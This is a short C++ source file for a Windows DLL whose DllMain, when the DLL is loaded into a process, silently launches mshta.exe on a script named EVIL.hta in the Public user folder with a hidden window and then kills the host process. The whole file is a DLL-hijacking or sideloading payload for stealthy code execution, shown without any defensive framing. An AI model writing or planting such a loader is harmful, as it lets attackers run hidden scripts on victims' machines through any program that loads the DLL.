// dllmain.cpp : Defines the entry point for the DLL application.

#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	char cmd[] = "C:\\Windows\\SysWOW64\\mshta.exe C:\\Users\\Public\\EVIL.hta";

	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		WinExec(cmd, SW_HIDE);
		ExitProcess(0);
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}